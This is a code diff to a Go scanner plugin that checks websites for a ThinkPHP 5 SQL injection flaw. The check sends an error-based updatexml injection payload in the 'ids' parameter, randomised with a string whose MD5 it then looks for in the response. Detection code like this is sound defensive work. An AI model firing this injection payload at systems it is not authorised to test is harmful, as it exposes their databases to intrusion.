@@ -1,6 +1,7 @@
 package goplugin
 
 import (
+	"fmt"
 	"net/http"
 	"strings"
 
@@ -37,13 +38,18 @@ func (d *thinkphp5SQLIResult) GetResult() []plugin.Plugin {
 }
 
 func (d *thinkphp5SQLIResult) Check(URL string, meta plugin.TaskMeta) bool {
-	url := URL + "/index.php?ids[0,updatexml(0,concat(0xa,md5(2333333)),0)]=1"
+	randomBs := util.GetRandomBytes(6)
+	randomStr := string(randomBs)
+	md5Str := util.GetMd5(randomBs)
+	payload := fmt.Sprintf("/index.php?ids[0,updatexml(0,concat(0xa,md5(%%27%s%%27)),0)]=1", randomStr)
+	url := URL + payload
 	request, err := http.NewRequest("GET", url, nil)
 	resp, err := util.RequestDo(request, true)
 	if err != nil {
 		return false
 	}
-	if strings.Contains(resp.ResponseRaw, "e0793e2479f297230fa98558bc1d656") {
+	// thinkphp will cut mysql's error message in response
+	if strings.Contains(resp.ResponseRaw, md5Str[:10]) {
 		result := d.info
 		result.Response = resp.ResponseRaw
 		result.Request = resp.RequestRaw
